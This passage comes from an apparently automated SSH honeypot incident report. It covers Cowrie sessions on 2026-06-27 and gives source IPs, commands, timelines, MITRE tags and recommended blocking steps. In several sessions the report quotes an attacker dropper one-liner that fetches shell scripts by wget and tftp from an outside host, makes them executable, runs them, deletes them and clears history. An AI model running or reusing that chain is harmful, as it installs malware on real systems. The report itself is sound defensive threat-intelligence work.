| `2026-06-27 13:42:14` | `cowrie.session.params` |
| `2026-06-27 13:42:14` | `cowrie.command.input` |
| `2026-06-27 13:42:14` | `cowrie.log.closed` |
| `2026-06-27 13:42:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd8681544996

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:42 |
| **Last Seen** | 2026-06-27 13:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:42:37` | `cowrie.session.connect` |
| `2026-06-27 13:42:37` | `cowrie.client.version` |
| `2026-06-27 13:42:38` | `cowrie.client.kex` |
| `2026-06-27 13:42:38` | `cowrie.login.success` |
| `2026-06-27 13:42:39` | `cowrie.session.params` |
| `2026-06-27 13:42:39` | `cowrie.command.input` |
| `2026-06-27 13:42:39` | `cowrie.log.closed` |
| `2026-06-27 13:42:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c07aa5306039

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:43 |
| **Last Seen** | 2026-06-27 13:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:43:39` | `cowrie.session.connect` |
| `2026-06-27 13:43:39` | `cowrie.client.version` |
| `2026-06-27 13:43:40` | `cowrie.client.kex` |
| `2026-06-27 13:43:40` | `cowrie.login.success` |
| `2026-06-27 13:43:41` | `cowrie.session.params` |
| `2026-06-27 13:43:41` | `cowrie.command.input` |
| `2026-06-27 13:43:41` | `cowrie.log.closed` |
| `2026-06-27 13:43:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c22d3f5999a3

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:44 |
| **Last Seen** | 2026-06-27 13:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:44:43` | `cowrie.session.connect` |
| `2026-06-27 13:44:43` | `cowrie.client.version` |
| `2026-06-27 13:44:43` | `cowrie.client.kex` |
| `2026-06-27 13:44:44` | `cowrie.login.success` |
| `2026-06-27 13:44:44` | `cowrie.session.params` |
| `2026-06-27 13:44:44` | `cowrie.command.input` |
| `2026-06-27 13:44:44` | `cowrie.log.closed` |
| `2026-06-27 13:44:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ccac15a921a

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:45 |
| **Last Seen** | 2026-06-27 13:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:45:46` | `cowrie.session.connect` |
| `2026-06-27 13:45:46` | `cowrie.client.version` |
| `2026-06-27 13:45:46` | `cowrie.client.kex` |
| `2026-06-27 13:45:47` | `cowrie.login.success` |
| `2026-06-27 13:45:48` | `cowrie.session.params` |
| `2026-06-27 13:45:48` | `cowrie.command.input` |
| `2026-06-27 13:45:48` | `cowrie.log.closed` |
| `2026-06-27 13:45:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db73c8199cce

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:46 |
| **Last Seen** | 2026-06-27 13:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:46:51` | `cowrie.session.connect` |
| `2026-06-27 13:46:51` | `cowrie.client.version` |
| `2026-06-27 13:46:51` | `cowrie.client.kex` |
| `2026-06-27 13:46:51` | `cowrie.login.success` |
| `2026-06-27 13:46:52` | `cowrie.session.params` |
| `2026-06-27 13:46:52` | `cowrie.command.input` |
| `2026-06-27 13:46:52` | `cowrie.log.closed` |
| `2026-06-27 13:46:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccac24eb189b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:47 |
| **Last Seen** | 2026-06-27 13:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:47:55` | `cowrie.session.connect` |
| `2026-06-27 13:47:55` | `cowrie.client.version` |
| `2026-06-27 13:47:55` | `cowrie.client.kex` |
| `2026-06-27 13:47:55` | `cowrie.login.success` |
| `2026-06-27 13:47:56` | `cowrie.session.params` |
| `2026-06-27 13:47:56` | `cowrie.command.input` |
| `2026-06-27 13:47:56` | `cowrie.log.closed` |
| `2026-06-27 13:47:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-677beee56ded

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:48 |
| **Last Seen** | 2026-06-27 13:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:48:57` | `cowrie.session.connect` |
| `2026-06-27 13:48:57` | `cowrie.client.version` |
| `2026-06-27 13:48:57` | `cowrie.client.kex` |
| `2026-06-27 13:48:58` | `cowrie.login.success` |
| `2026-06-27 13:48:58` | `cowrie.session.params` |
| `2026-06-27 13:48:58` | `cowrie.command.input` |
| `2026-06-27 13:48:58` | `cowrie.log.closed` |
| `2026-06-27 13:48:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba9ac7ec0c6d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:50 |
| **Last Seen** | 2026-06-27 13:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:50:00` | `cowrie.session.connect` |
| `2026-06-27 13:50:00` | `cowrie.client.version` |
| `2026-06-27 13:50:01` | `cowrie.client.kex` |
| `2026-06-27 13:50:01` | `cowrie.login.success` |
| `2026-06-27 13:50:02` | `cowrie.session.params` |
| `2026-06-27 13:50:02` | `cowrie.command.input` |
| `2026-06-27 13:50:02` | `cowrie.log.closed` |
| `2026-06-27 13:50:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9dbddd850c8

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-27 13:50 |
| **Last Seen** | 2026-06-27 13:51 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:50:54` | `cowrie.session.connect` |
| `2026-06-27 13:50:55` | `cowrie.client.version` |
| `2026-06-27 13:50:55` | `cowrie.client.kex` |
| `2026-06-27 13:51:02` | `cowrie.login.success` |
| `2026-06-27 13:51:05` | `cowrie.session.params` |
| `2026-06-27 13:51:05` | `cowrie.command.input` |
| `2026-06-27 13:51:06` | `cowrie.log.closed` |
| `2026-06-27 13:51:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b37890b8bc4

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:51 |
| **Last Seen** | 2026-06-27 13:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:51:05` | `cowrie.session.connect` |
| `2026-06-27 13:51:05` | `cowrie.client.version` |
| `2026-06-27 13:51:05` | `cowrie.client.kex` |
| `2026-06-27 13:51:05` | `cowrie.login.success` |
| `2026-06-27 13:51:06` | `cowrie.session.params` |
| `2026-06-27 13:51:06` | `cowrie.command.input` |
| `2026-06-27 13:51:06` | `cowrie.log.closed` |
| `2026-06-27 13:51:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-971cf0257669

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:52 |
| **Last Seen** | 2026-06-27 13:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:52:11` | `cowrie.session.connect` |
| `2026-06-27 13:52:11` | `cowrie.client.version` |
| `2026-06-27 13:52:12` | `cowrie.client.kex` |
| `2026-06-27 13:52:12` | `cowrie.login.success` |
| `2026-06-27 13:52:13` | `cowrie.session.params` |
| `2026-06-27 13:52:13` | `cowrie.command.input` |
| `2026-06-27 13:52:13` | `cowrie.log.closed` |
| `2026-06-27 13:52:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ace02681b0d3

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]140` |
| **First Seen** | 2026-06-27 13:53 |
| **Last Seen** | 2026-06-27 13:53 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://83.168.110[.]191/re.sh; chmod 777 *; sh re.sh; tftp -g 83.168.110[.]191 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c` |
| **Download Attempts** | hxxp://83.168.110[.]191/re.sh, hxxp://83.168.110[.]191/updaterros.x86_64, hxxp://83.168.110[.]191/updaterros.aarch64 |
| **Malware Analysis** | 93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db (MEDIUM), 21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c (MEDIUM), 6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e (MEDIUM), 3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569 (MEDIUM), cc653189103bd14e46958bae5f37f94852b7d54ced5662bf7858801c138645a8 (MEDIUM) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:53:23` | `cowrie.session.connect` |
| `2026-06-27 13:53:24` | `cowrie.login.success` |
| `2026-06-27 13:53:24` | `cowrie.session.params` |
| `2026-06-27 13:53:26` | `cowrie.command.input` |
| `2026-06-27 13:53:26` | `cowrie.command.input` |
| `2026-06-27 13:53:26` | `cowrie.session.file_download` |
| `2026-06-27 13:53:27` | `cowrie.session.file_download` |
| `2026-06-27 13:53:27` | `cowrie.session.file_download.failed` |
| `2026-06-27 13:53:36` | `cowrie.session.file_download.failed` |
| `2026-06-27 13:53:37` | `cowrie.session.file_download` |
| `2026-06-27 13:53:37` | `cowrie.session.file_download` |
| `2026-06-27 13:53:37` | `cowrie.session.file_download` |
| `2026-06-27 13:53:38` | `cowrie.session.file_download` |
| `2026-06-27 13:53:41` | `cowrie.log.closed` |
| `2026-06-27 13:53:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]140` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1047a52d3755

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:53 |
| **Last Seen** | 2026-06-27 13:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:53:25` | `cowrie.session.connect` |
| `2026-06-27 13:53:25` | `cowrie.client.version` |
| `2026-06-27 13:53:25` | `cowrie.client.kex` |
| `2026-06-27 13:53:25` | `cowrie.login.success` |
| `2026-06-27 13:53:26` | `cowrie.session.params` |
| `2026-06-27 13:53:26` | `cowrie.command.input` |
| `2026-06-27 13:53:26` | `cowrie.log.closed` |
| `2026-06-27 13:53:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46024a1a4908

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:54 |
| **Last Seen** | 2026-06-27 13:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:54:33` | `cowrie.session.connect` |
| `2026-06-27 13:54:33` | `cowrie.client.version` |
| `2026-06-27 13:54:33` | `cowrie.client.kex` |
| `2026-06-27 13:54:33` | `cowrie.login.success` |
| `2026-06-27 13:54:34` | `cowrie.session.params` |
| `2026-06-27 13:54:34` | `cowrie.command.input` |
| `2026-06-27 13:54:34` | `cowrie.log.closed` |
| `2026-06-27 13:54:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5eaf9c0d311

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]140` |
| **First Seen** | 2026-06-27 13:55 |
| **Last Seen** | 2026-06-27 13:55 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://83.168.110[.]191/re.sh; chmod 777 *; sh re.sh; tftp -g 83.168.110[.]191 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c` |
| **Download Attempts** | hxxp://83.168.110[.]191/re.sh, hxxp://83.168.110[.]191/updaterros.x86_64, hxxp://83.168.110[.]191/updaterros.x86_64 |
| **Malware Analysis** | 93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db (MEDIUM), 21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c (MEDIUM), 6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e (MEDIUM), 3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569 (MEDIUM), cc653189103bd14e46958bae5f37f94852b7d54ced5662bf7858801c138645a8 (MEDIUM) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:55:08` | `cowrie.session.connect` |
| `2026-06-27 13:55:08` | `cowrie.login.success` |
| `2026-06-27 13:55:09` | `cowrie.session.params` |
| `2026-06-27 13:55:10` | `cowrie.command.input` |
| `2026-06-27 13:55:10` | `cowrie.command.input` |
| `2026-06-27 13:55:11` | `cowrie.session.file_download` |
| `2026-06-27 13:55:11` | `cowrie.session.file_download` |
| `2026-06-27 13:55:11` | `cowrie.session.file_download.failed` |
| `2026-06-27 13:55:11` | `cowrie.session.file_download` |
| `2026-06-27 13:55:11` | `cowrie.session.file_download` |
| `2026-06-27 13:55:12` | `cowrie.session.file_download` |
| `2026-06-27 13:55:12` | `cowrie.session.file_download` |
| `2026-06-27 13:55:12` | `cowrie.session.file_download` |
| `2026-06-27 13:55:25` | `cowrie.log.closed` |
| `2026-06-27 13:55:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]140` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2aa7ffa1759

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:55 |
| **Last Seen** | 2026-06-27 13:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:55:38` | `cowrie.session.connect` |
| `2026-06-27 13:55:38` | `cowrie.client.version` |
| `2026-06-27 13:55:38` | `cowrie.client.kex` |
| `2026-06-27 13:55:38` | `cowrie.login.success` |
| `2026-06-27 13:55:39` | `cowrie.session.params` |
| `2026-06-27 13:55:39` | `cowrie.command.input` |
| `2026-06-27 13:55:39` | `cowrie.log.closed` |
| `2026-06-27 13:55:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3741e0a8c69

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:56 |
| **Last Seen** | 2026-06-27 13:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:56:44` | `cowrie.session.connect` |
| `2026-06-27 13:56:44` | `cowrie.client.version` |
| `2026-06-27 13:56:44` | `cowrie.client.kex` |
| `2026-06-27 13:56:44` | `cowrie.login.success` |
| `2026-06-27 13:56:45` | `cowrie.session.params` |
| `2026-06-27 13:56:45` | `cowrie.command.input` |
| `2026-06-27 13:56:45` | `cowrie.log.closed` |
| `2026-06-27 13:56:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-102fa6cc0db6

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-27 13:56 |
| **Last Seen** | 2026-06-27 13:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:56:46` | `cowrie.session.connect` |
| `2026-06-27 13:56:47` | `cowrie.client.version` |
| `2026-06-27 13:56:47` | `cowrie.client.kex` |
| `2026-06-27 13:56:48` | `cowrie.login.success` |
| `2026-06-27 13:56:50` | `cowrie.session.params` |
| `2026-06-27 13:56:50` | `cowrie.command.input` |
| `2026-06-27 13:56:50` | `cowrie.log.closed` |
| `2026-06-27 13:56:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94c7267c3e79

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]140` |
| **First Seen** | 2026-06-27 13:57 |
| **Last Seen** | 2026-06-27 13:57 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://83.168.110[.]191/re.sh; chmod 777 *; sh re.sh; tftp -g 83.168.110[.]191 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:57:41` | `cowrie.session.connect` |
| `2026-06-27 13:57:41` | `cowrie.login.success` |
| `2026-06-27 13:57:42` | `cowrie.session.params` |
| `2026-06-27 13:57:43` | `cowrie.command.input` |
| `2026-06-27 13:57:43` | `cowrie.command.input` |
| `2026-06-27 13:57:53` | `cowrie.session.file_download.failed` |
| `2026-06-27 13:57:58` | `cowrie.log.closed` |
| `2026-06-27 13:57:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]140` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d4b847d90d7

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:57 |
| **Last Seen** | 2026-06-27 13:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:57:50` | `cowrie.session.connect` |
| `2026-06-27 13:57:50` | `cowrie.client.version` |
| `2026-06-27 13:57:50` | `cowrie.client.kex` |
| `2026-06-27 13:57:50` | `cowrie.login.success` |
| `2026-06-27 13:57:51` | `cowrie.session.params` |
| `2026-06-27 13:57:51` | `cowrie.command.input` |
| `2026-06-27 13:57:51` | `cowrie.log.closed` |
| `2026-06-27 13:57:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-860bdb3e6a87

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 13:58 |
| **Last Seen** | 2026-06-27 13:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 13:58:59` | `cowrie.session.connect` |
| `2026-06-27 13:58:59` | `cowrie.client.version` |
| `2026-06-27 13:58:59` | `cowrie.client.kex` |
| `2026-06-27 13:58:59` | `cowrie.login.success` |
| `2026-06-27 13:59:00` | `cowrie.session.params` |
| `2026-06-27 13:59:00` | `cowrie.command.input` |
| `2026-06-27 13:59:00` | `cowrie.log.closed` |
| `2026-06-27 13:59:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed950a24a246

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:00 |
| **Last Seen** | 2026-06-27 14:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:00:10` | `cowrie.session.connect` |
| `2026-06-27 14:00:10` | `cowrie.client.version` |
| `2026-06-27 14:00:10` | `cowrie.client.kex` |
| `2026-06-27 14:00:10` | `cowrie.login.success` |
| `2026-06-27 14:00:11` | `cowrie.session.params` |
| `2026-06-27 14:00:11` | `cowrie.command.input` |
| `2026-06-27 14:00:11` | `cowrie.log.closed` |
| `2026-06-27 14:00:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bea2e08841f2

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:01 |
| **Last Seen** | 2026-06-27 14:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:01:00` | `cowrie.session.connect` |
| `2026-06-27 14:01:00` | `cowrie.client.version` |
| `2026-06-27 14:01:00` | `cowrie.client.kex` |
| `2026-06-27 14:01:00` | `cowrie.login.success` |
| `2026-06-27 14:01:01` | `cowrie.session.params` |
| `2026-06-27 14:01:01` | `cowrie.command.input` |
